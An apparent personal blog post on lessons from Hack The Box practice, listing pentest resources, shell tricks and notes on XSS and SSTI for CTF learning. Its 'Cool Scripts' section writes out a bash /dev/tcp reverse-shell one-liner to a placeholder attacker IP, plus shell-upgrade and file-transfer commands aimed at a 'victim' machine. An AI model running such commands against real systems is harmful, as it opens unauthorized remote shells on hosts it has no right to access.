---
layout: post
title: What I've Learned from Hackthebox So Far
subtitle: Started it for a good time, and still going
# gh-repo: https://github.com/signalapp
# gh-badge: [star, fork, follow]
tags: [hackthebox, CTF, hack, hacking, informational]
comments: true
published: true
---

I recently reached the rank of hacker on hackthebox here is some of the cool things I learned along the way.

![encryption](/assets/img/hackthebox-logo.png){: .mx-auto.d-block :}

I have been doing hackthebox on the side for about a month now, so here is some of my thoughts and cool thing I learned while breaking into boxes.
I’m currently sitting at the very start of Hacker rank with 6 userowns, 5 root owns, and 4 challenges.

![encryption](/assets/img/hackthebox-owns.jpg){: .mx-auto.d-block :}


I will be mostly writing about my experience with boxes rather than the challenges since they taught me the most and I had the most fun finishing them.
Let’s dive in!

### Very Useful Githubs

#### GTFOBins

[GTFOBins](https://gtfobins.github.io/) is basically a super collection of Unix binaries mostly focused on breaking restricted shells. I have a long list of binaries made for common Unix tools for breaking out of restricted shells and escalate privilege. I was a bit hard for me to follow the instructions at first, but after using them for a few machines, I think i have the gist of how to follow them.

#### PayloadsAllTheThings

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is a super collection of a set of payloads for lots and lots of Windows, macOS, Linux, and ChromeOs software and tool. Most of them come with kali version of Metasploit but using them without a Metasploit taught me a lot about how these things work. I do recommend trying this webpage before Metasploit if you are sure to know where exactly the vulnerability is.

#### PEAS(LinPeas)

After trying multiple enumeration tools I found the community favorite [PEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), and what a find this was. LinPeas (PEAS for linux) by far gave the most information of all the other ones and had everything color coded based on how critical they are. I LOVE THIS THING.


### Cool Scripts

#### Spawn a Bash Shell from a Python Environment
stuck in a Python shell?
~~~
python3 -c 'import pty; pty.spawn("/bin/bash")'
~~~

#### Reverse Shell with One Line of Code
combine it with netcat and you are in for a good time.
~~~
bash -i >& /dev/tcp/<YOUR IP>/<THE PORT UR LISTENING ON> 0>&1 | sh
~~~

#### Host a Webpage with One Line of Code
Need to download a file to the victims machine or the other way around?
~~~
python3 -m http.server <PORT NUMBER>
~~~

### Useful Websites

#### Hash Identifier

During my journey, I came across multiple hashes that I didn’t know what they are. Which is a problem when it comes down to trying to decrypt. I know you can always look at hashcat and john examples to try and find out what kind hash you have. but using a website like [hashes.com](https://hashes.com/en/tools/hash_identifier) is much easier and faster.

#### HackerOne, Intigirity, Bugcrowd and Other Bug Bounty Websites

Very useful in case you need a thorough read on a vulnerability. Since bug hunters need to have a write for the compony to receive their bounty, they usually have very thorough and in depth guide on how to recreate or abuse the bug they have found.

#### Application User Manual

Lots of times, you know exactly what application you need to exploit because of all the hints, but you have know idea what your foothold is. Try reading the application manual. It always lists the set dependencies, privileges, default ports, etc. that can be later researched to find vulnerability in.

### Common Web Application Vulnerabilities

#### XSS

XSS is often ignore if the website isn’t and multiuser environment like social media. Since it is mostly used to stead data from other users, but you can still use XSS to grab admin passwords of websites. The best bug hunters gained their fame from abusing XSS on Fortune 500 companies and gaining bank from it.

#### SSTI

SSTI or Server-Side Template Injection is a very common vulnerability among web applications like flask running on Python. There is a very quick way of testing if a website is vulnerable to it as show below. It so quick to do its almost always worth a try.

![encryption](/assets/img/SSTI.png){: .mx-auto.d-block :}

### Linux Tools I Did'nt Know Exist But I Ended Up Using A lot

##### NETCAT 
Other than its usual usage like port listening, this is also used heavily in getting a reverse shell.

##### netpgp
Got a encrypted file?


### Skills I Want To Improve On

  - XSS
  - Java Script Injection
  - Not relying on Metasploit
  - Using r2 for reading binaries
  - Being More Observant
  - Not pressing Ctrl + C in a reverse shell -_-


{: .box-warning}
**Warning:** This post is meant to be educational and only used in ethical hacking. Please do not use any of the tools or commands mentioned here in a malicious way.
